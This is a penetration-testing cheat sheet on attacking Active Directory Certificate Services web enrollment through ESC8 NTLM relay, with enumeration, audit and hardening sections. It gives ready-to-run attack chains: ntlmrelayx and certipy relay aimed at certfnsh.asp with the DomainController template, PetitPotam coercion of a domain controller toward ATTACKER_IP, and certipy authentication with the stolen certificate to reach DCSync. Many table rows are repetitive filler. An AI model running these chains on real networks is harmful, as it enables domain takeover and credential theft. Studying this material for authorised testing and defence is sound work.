---
aliases:
  - Web Enrollment ADCS
  - certsrv
  - ESC8 NTLM Relay
  - Channel Binding EPA
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - ADCS Enumeration]]"
  - "[[NTLM Relay]]"
---
# AD - ADCS Enumeration - Web Enrollment & NTLM Relay

***

## Web Enrollment Endpoints

| **Endpoint** | **Use** | **Notas** |
|:---:|:---:|:---:|
| `/certsrv/` | Main portal | Standard. |
| `/certsrv/certfnsh.asp` | Cert finish | ESC8 target. |
| `/certsrv/certrqxt.asp` | Cert request | Adjacent. |
| `/certsrv/CertEnroll/` | Enrollment files | Adjacent. |
| `/certsrv/mscep/` | NDES (SCEP) | Edge. |
| `/certsrv/mscep_admin/` | SCEP admin | Edge. |
| HTTP port 80 | Default IIS | Standard. |
| HTTPS port 443 | Hardened | Standard. |
| Per-CA may have/not have | Edge | Edge. |
| `nmap -p 80,443 --script http-* CA-IP` | Discovery | Standard. |
| `curl -I http://CA/certsrv/` | Probe | Standard. |
| Authentication required | Standard | Standard. |
| Default: NTLM | Vulnerable | Critical. |
| Modern: Negotiate (Kerberos) | Hardening | Standard. |
| ADCS Web Enrollment is optional feature | Sometimes disabled | Audit. |
| Detection: bulk certsrv requests | Defender | Adjacent. |
^ad-webenroll-endpoints

### Endpoint discovery

```bash
# Per-CA endpoint check
CAS=$(certipy find -u user -p pass -dc-ip DC -json | jq -r '.[].CAs[].DNSHostName')
for ca in $CAS; do
  echo "=== $ca ==="
  curl -sI "http://$ca/certsrv/" 2>&1 | head -3
  curl -sI "https://$ca/certsrv/" 2>&1 | head -3
  curl -sI "http://$ca/certsrv/certfnsh.asp" 2>&1 | head -3
done

# nmap script
nmap -p 80,443 --script http-* CA-IP
```

___

## ESC8 (NTLM Relay to Web Enrollment)

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| Default IIS NTLM auth | Vulnerable | Critical. |
| HTTPS without Channel Binding (EPA) | Vulnerable | Critical. |
| NTLM Relay to certsrv | Standard chain | Critical. |
| Atacante coerces auth → relay → cert | Multi-step | Standard. |
| Relay target: any vulnerable template | DomainController template common | Standard. |
| `ntlmrelayx --target http://CA/certsrv/certfnsh.asp --adcs --template DomainController` | Standard tool | Standard. |
| With HTTPS: `--target https://CA/certsrv/certfnsh.asp --adcs --template ...` | If no Channel Binding | Standard. |
| Result: cert as relayed account (often DC$ = privileged) | Critical | Critical. |
| Combined with Coercion (PetitPotam etc.) | Force DC auth | Standard chain. |
| `ntlmrelayx -tf targets.txt --adcs` | Bulk relay | Adjacent. |
| `certipy relay -ca CA -target dc01` | Modern alternative | Adjacent. |
| Detection: relayed cert issuance | Defender | Adjacent. |
| Mitigation: Channel Binding (EPA) | Direct fix | Standard. |
| Mitigation: HTTPS only | Standard | Hardening. |
| Mitigation: SMB Signing required | Adjacent | Hardening. |
| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
^ad-webenroll-esc8

### ESC8 attack chain

```bash
# Setup ntlmrelayx target
sudo ntlmrelayx.py \
  -t http://CA/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController \
  --no-smb-server

# Or HTTPS (if no EPA)
sudo ntlmrelayx.py \
  -t https://CA/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController

# Coerce DC auth (PetitPotam)
python3 PetitPotam.py ATTACKER_IP DC_IP

# Result: cert issued as DC$ (privileged) → use for DCSync
```

___

## NDES (SCEP) Endpoint

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| NDES = Network Device Enrollment Service | SCEP protocol | Edge. |
| `/certsrv/mscep/` | Endpoint | Standard. |
| `/certsrv/mscep_admin/` | Admin | Standard. |
| Used for network devices (routers, etc.) | Standard | Standard. |
| Less common than Web Enrollment | Edge | Edge. |
| Authentication: HTTP | Vulnerable like ESC8 | Adjacent. |
| Atacante: SCEP cert request | Adjacent | Edge. |
| `curl -I http://CA/certsrv/mscep/` | Probe | Standard. |
| Detection: NDES events | Defender | Adjacent. |
| Adjacent: ESC8-like vector | Adjacent | Adjacent. |
| Modern: HTTPS + EPA | Hardening | Standard. |
| Audit: per-CA NDES enabled | Standard | Compliance. |
| Disabled by default in modern installations | Standard | Standard. |
| Cleanup: post-engagement | Standard | OPSEC. |
| Compliance: minimal NDES | Best practice | Standard. |
| Modern: extreme audit | Best practice | Standard. |
^ad-webenroll-ndes

### NDES discovery

```bash
# Per-CA NDES check
for ca in $CAS; do
  echo "=== $ca ==="
  curl -sI "http://$ca/certsrv/mscep/" 2>&1 | head -3
  curl -sI "https://$ca/certsrv/mscep/" 2>&1 | head -3
done
```

___

## Channel Binding (EPA) Audit

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| EPA = Extended Protection for Authentication | Channel Binding | Standard. |
| Defeats NTLM Relay over HTTPS | Modern hardening | Standard. |
| Requires Negotiate / Kerberos | Adjacent | Standard. |
| Per-IIS site configurable | Granular | Standard. |
| `Get-WebConfigurationProperty` for IIS audit | Native | Standard. |
| Default: disabled (legacy) | Vulnerable | Audit. |
| Modern: required | Hardening | Standard. |
| Combined with HTTPS-only | Standard hardening | Adjacent. |
| Per-CA Web Enrollment check | Standard | Compliance. |
| Detection: relay attempt without EPA | Defender | Adjacent. |
| Modern: extreme audit per-CA | Best practice | Standard. |
| Audit: per-quarter EPA check | Standard | Compliance. |
| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
| Microsoft KB on EPA | Reference | Standard. |
| Modern: continuous monitoring | Defender | Standard. |
| Compliance: documented baseline | Standard | Adjacent. |
^ad-webenroll-epa

### EPA audit

```powershell
# On CA host
Import-Module WebAdministration

Get-WebConfigurationProperty -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -PSPath "IIS:\Sites\Default Web Site\CertSrv" `
  -Name "extendedProtection.tokenChecking"

# Output: None | Allow | Required
# Required = EPA enforced (modern hardening)
# None = vulnerable (default legacy)
```

___

## SMB Signing Cross-Correlate

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| ESC8 chain requires NTLM Relay viability | Standard | Standard. |
| SMB Signing required = relay blocked at SMB | Adjacent | Standard. |
| ADCS Web Enrollment over HTTP/HTTPS | Different protocol | Standard. |
| HTTPS without EPA = vulnerable still | Edge | Critical. |
| Cross-correlate per-CA SMB + Web settings | Standard | Audit. |
| `nxc smb CA-IP --signing` | SMB check | Adjacent. |
| Per-CA hardening checklist | Standard | Compliance. |
| Detection: cross-protocol relay attempts | Defender | Adjacent. |
| Modern: SMB Signing + EPA + HTTPS | Comprehensive | Hardening. |
| Audit: per-CA all protocols | Standard | Compliance. |
| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
| Cleanup post-engagement | Standard | OPSEC. |
| Compliance: documented baseline | Standard | Adjacent. |
| Modern: continuous monitoring | Defender | Standard. |
| Cross-correlate Coercion + Relay + ADCS | Standard | Audit. |
| Modern: extreme alerting | Best practice | Standard. |
^ad-webenroll-smbcross

### Comprehensive ESC8 readiness check

```bash
# Per-CA check: SMB signing + EPA + HTTPS
for ca in $CAS; do
  echo "=== $ca ==="
  
  # SMB signing
  nxc smb $ca --signing
  
  # HTTP certsrv reachable
  curl -sI "http://$ca/certsrv/" 2>&1 | head -3
  
  # HTTPS certsrv
  curl -sI "https://$ca/certsrv/" 2>&1 | head -3
  
  # EPA check (manual on CA host)
done
```

___

## Coercion Sources for ESC8

| **Coercion** | **Trigger** | **Notas** |
|:---:|:---:|:---:|
| PetitPotam | EFS RPC | Standard. |
| PrinterBug | SpoolSubsystem | Standard. |
| DFSCoerce | DFS RPC | Modern. |
| ShadowCoerce | FileSystem RPC | Modern. |
| coerce MS-RPRN | Print spooler | Standard. |
| Any RPC coercion | Force DC auth | Standard. |
| DC auth → relay to certsrv → DC cert | Standard chain | Critical. |
| Combined with --remove-mic | Adjacent | Adjacent. |
| Modern: post-patch limits some coercion | Standard | Adjacent. |
| Adjacent: Coercion hub | Cross-ref | Adjacent. |
| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
| Detection: coercion + relay events | Defender | Adjacent. |
| Modern: KB patches for coercion | Standard | Adjacent. |
| OPSEC: coercion is loud | Adjacent | OPSEC. |
| Cleanup: nothing (passive coercion) | Standard | OPSEC. |
| Compliance: per-RPC patch status | Standard | Adjacent. |
^ad-webenroll-coercion

### ESC8 + Coercion chain

```bash
# Terminal 1: ntlmrelayx setup
sudo ntlmrelayx.py \
  -t http://CA/certsrv/certfnsh.asp \
  --adcs \
  --template DomainController \
  --no-smb-server

# Terminal 2: PetitPotam coerce DC
python3 PetitPotam.py ATTACKER_IP DC_IP

# Result: ntlmrelayx receives cert for DC$
# Use cert for DCSync
certipy auth -pfx dc.pfx -dc-ip DC

# Output: TGT for DC$ + NT hash
# Use TGT for DCSync (Pass-the-Ticket)
```

___

## Modern certipy Relay Module

| **Concepto** | **Detalle** | **Notas** |
|:---:|:---:|:---:|
| `certipy relay -ca CA-Name -target dc01` | Modern alternative to ntlmrelayx | Tool. |
| Built-in coercion + relay | Comprehensive | Standard. |
| Per-CA targeted relay | Standard | Standard. |
| HTTP and HTTPS support | Standard | Standard. |
| Auto-detects ESC8 viability | Adjacent | Adjacent. |
| `certipy relay -ca CA -shadow` | Combined Shadow Cred | Adjacent. |
| `certipy relay --target` flexible | Standard | Standard. |
| Detection: relay events | Defender | Adjacent. |
| Modern: post-engagement cleanup | Standard | OPSEC. |
| Cross-correlate with target priv | Standard | Audit. |
| Adjacent: ADCS Abuse hub | Cross-ref | Adjacent. |
| Compliance: red team scoped | Standard | OPSEC. |
| Audit log retention | Standard | Adjacent. |
| Modern: extreme alerting | Best practice | Standard. |
| Per-engagement documentation | Standard | Adjacent. |
| Cleanup: revert cert issuance impact | Standard | OPSEC. |
^ad-webenroll-certipy-relay

### certipy relay

```bash
# Modern certipy relay (alternative to ntlmrelayx --adcs)
certipy relay -ca CA-Name -target dc01.dom.local

# Or specific endpoint
certipy relay -target http://CA/certsrv/certfnsh.asp -ca CA-Name
```

___

## Mitigations

| **Mitigation** | **Detail** | **Notas** |
|:---:|:---:|:---:|
| Disable Web Enrollment if not needed | Direct fix | Hardening. |
| `Uninstall-WindowsFeature ADCS-Web-Enrollment` | PowerShell | Adjacent. |
| HTTPS-only Web Enrollment | Standard | Hardening. |
| Channel Binding (EPA) required | Modern | Hardening. |
| SMB Signing required (cross-correlate) | Adjacent | Hardening. |
| Patch coercion CVEs (PetitPotam etc.) | Standard | Adjacent. |
| Detection: relay events + cert issuance | Defender | Adjacent. |
| Microsoft Defender for Identity Web Enrollment alerts | Modern | Defender. |
| Per-CA Web Enrollment audit | Standard | Compliance. |
| Per-quarter audit | Standard | Compliance. |
| Modern: extreme alerting | Critical | Standard. |
| Adjacent: NTLM Relay hub | Cross-ref | Adjacent. |
| Cleanup post-engagement | Standard | OPSEC. |
| Compliance: documented baseline | Standard | Adjacent. |
| Audit log retention | Standard | Adjacent. |
| Modern: continuous monitoring | Defender | Standard. |
^ad-webenroll-mitigations

### Hardening commands

```powershell
# Audit Web Enrollment status
Get-WindowsFeature ADCS-Web-Enrollment

# Disable if not needed
Uninstall-WindowsFeature ADCS-Web-Enrollment

# Enable EPA on IIS site
Set-WebConfigurationProperty -Filter "system.webServer/security/authentication/windowsAuthentication" `
  -PSPath "IIS:\Sites\Default Web Site\CertSrv" `
  -Name "extendedProtection.tokenChecking" -Value "Required"

# HTTPS only redirect
# (Manual via IIS Manager or applicationHost.config)
```

***
